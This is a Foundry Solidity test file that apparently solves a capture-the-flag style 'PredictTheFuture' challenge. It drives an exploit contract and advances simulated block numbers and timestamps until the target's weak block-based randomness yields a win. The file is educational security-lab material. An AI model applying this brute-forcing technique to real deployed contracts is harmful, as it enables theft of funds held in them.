// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.roll(104293);
        vm.warp(93582192);

        // Put your solution here
        vm.deal(address(this), 10e18);

        uint256 blockNumber = 104293;
        uint256 timestamp = 93582192;

        uint8 guess = uint8((blockNumber + timestamp) % 10);

        exploitContract.lockInGuess{value: 1e18}(guess);

        while (!predictTheFuture.isComplete()) {
            try exploitContract.settleChallenge() {}
            catch {
                blockNumber++;
                timestamp += 12;

                vm.roll(blockNumber);
                vm.warp(timestamp);
            }
        }

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
